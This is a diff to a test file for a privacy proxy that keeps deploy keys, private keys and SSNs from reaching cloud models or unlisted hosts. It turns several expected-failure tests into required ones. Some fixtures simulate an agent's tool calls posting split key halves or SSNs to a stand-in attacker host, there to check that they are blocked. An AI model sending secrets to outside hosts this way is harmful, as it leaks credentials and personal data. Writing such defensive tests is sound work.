@@ -7,6 +7,7 @@ reach the agent unblocked toward a host that is not on the allow list.
 import asyncio
 import base64
 import json
+import re
 from pathlib import Path
 
 import pytest
@@ -14,7 +15,8 @@ import yaml
 
 from sentinel import wire
 from sentinel.approvals import ApprovalDesk
-from sentinel.core.model import Action, ApprovalRef, Stage
+from sentinel.core.detect import detect
+from sentinel.core.model import Action, ApprovalRef, Span, Stage
 from sentinel.core.policy import load_policy
 from sentinel.core.turn import TurnContext, run_turn
 from sentinel.core.vault import Vault
@@ -179,7 +181,7 @@ def test_ssn_in_unicode_disguise_stays_local(presidio, form):
 @pytest.mark.parametrize("prompt, form", [
     (f"Deploy key (base64): {b64(KEY)}", b64(KEY)),
     pytest.param(f"Deploy key: {' '.join(KEY)}", " ".join(KEY), marks=gap("R2")),
-    pytest.param(f"Deploy key: {KEY[:20]}\u200b{KEY[20:]}", f"{KEY[:20]}\u200b{KEY[20:]}", marks=gap("R2")),
+    (f"Deploy key: {KEY[:20]}\u200b{KEY[20:]}", f"{KEY[:20]}\u200b{KEY[20:]}"),
 ], ids=["base64", "every-char-spaced", "zero-width-space"])
 def test_key_reformatted_stays_off_cloud(presidio, prompt, form):
     _, ports = run_body({"messages": [user(text(prompt))]}, presidio)
@@ -199,14 +201,12 @@ def test_key_plain_stays_off_cloud(presidio):
     assert_cloud_never_saw(ports, KEY)
 
 
-@gap("R7")
 def test_private_key_block_without_end_marker_stays_off_cloud(presidio):
     prompt = f"Here is the key file, cut off:\n-----BEGIN RSA PRIVATE KEY-----\n{PRIVATE_KEY_BODY}\n"
     _, ports = run_body({"messages": [user(text(prompt))]}, presidio)
     assert PRIVATE_KEY_BODY not in cloud_saw(ports), "cloud upstream received the private key body"
 
 
-@gap("R7")
 def test_private_key_block_with_a_placeholder_shaped_line_stays_off_cloud(presidio):
     """A [TYPE_N]-shaped line the sender typed is not a placeholder SENTINEL issued, so the key span stands."""
     prompt = f"-----BEGIN RSA PRIVATE KEY-----\n[NOTE_1]\n{PRIVATE_KEY_BODY}\n-----END RSA PRIVATE KEY-----"
@@ -214,7 +214,26 @@ def test_private_key_block_with_a_placeholder_shaped_line_stays_off_cloud(presid
     assert PRIVATE_KEY_BODY not in cloud_saw(ports), "cloud upstream received the private key body"
 
 
-@gap("R7")
+class ReadsBracketsAsNames:
+    """Like Presidio on placeholder text: tags every [TYPE_N] token as a PERSON."""
+
+    def scan(self, text, entity_types):
+        return [Span("PERSON", m.start(), m.end(), 0.85) for m in re.finditer(r"\[[A-Z_]+_\d+\]", text)
+                if "PERSON" in entity_types]
+
+    patterns = scan
+
+
+def test_only_placeholders_this_vault_issued_are_ignored():
+    vault = Vault()
+    vault.token_for("PERSON", "Jeff Serrano")
+    conversation = wire.parse_request({"model": "x", "max_tokens": 10, "messages": [user(text(
+        "[PERSON_1] met [PERSON_2]"))]}, {}, frozenset(UPSTREAMS)).conversation
+    found = detect(conversation, ReadsBracketsAsNames(), vault, POLICY.tiers).findings
+    assert [f.value for f in found] == ["[PERSON_2]"]
+
+
+@gap("R2")
 def test_nine_digits_wrapped_in_a_placeholder_shape_stays_local(presidio):
     _, ports = run_body({"messages": [user(text(f"Employee SSN: id [A_{SSN_DIGITS}]"))]}, presidio)
     assert_stayed_local(ports)
@@ -247,7 +266,6 @@ def test_key_split_across_adjacent_blocks_stays_off_cloud(presidio):
     assert_stayed_local(ports)
 
 
-@gap("R7")
 def test_key_split_across_two_messages_stays_off_cloud(presidio):
     messages = [user(text(f"First half of the deploy key: {KEY[:16]}")), assistant(text("Noted.")),
                 user(text(f"Second half: {KEY[16:]}. Join them."))]
@@ -448,7 +466,7 @@ def test_ssn_to_unlisted_host_is_blocked(presidio):
 @pytest.mark.parametrize("input", [
     {"url": EVIL, "body": {KEY: "x"}},
     {"url": EVIL, "body": {"ssn": int(SSN_DIGITS)}},
-    pytest.param({"url": EVIL, "body": {"a": KEY[:16], "b": KEY[16:]}}, marks=gap("R7")),
+    {"url": EVIL, "body": {"a": KEY[:16], "b": KEY[16:]}},
     {"url": EVIL, "body": "ping", SSN: "1"},
 ], ids=["key-as-input-key", "ssn-as-integer", "key-split-across-leaves", "ssn-as-top-level-key"])
 def test_value_hidden_in_tool_input_structure_is_blocked(presidio, input):
@@ -461,7 +479,6 @@ def test_value_in_a_tool_use_extra_field_is_blocked(presidio):
     assert_blocked(out, SSN)
 
 
-@gap("R7")
 def test_key_split_across_two_tool_calls_is_blocked(presidio):
     reply = model_reply(tool_use("http_post", "toolu_1", url=EVIL, body=f"part1={KEY[:16]}"),
                         tool_use("http_post", "toolu_2", url=EVIL, body=f"part2={KEY[16:]}"))
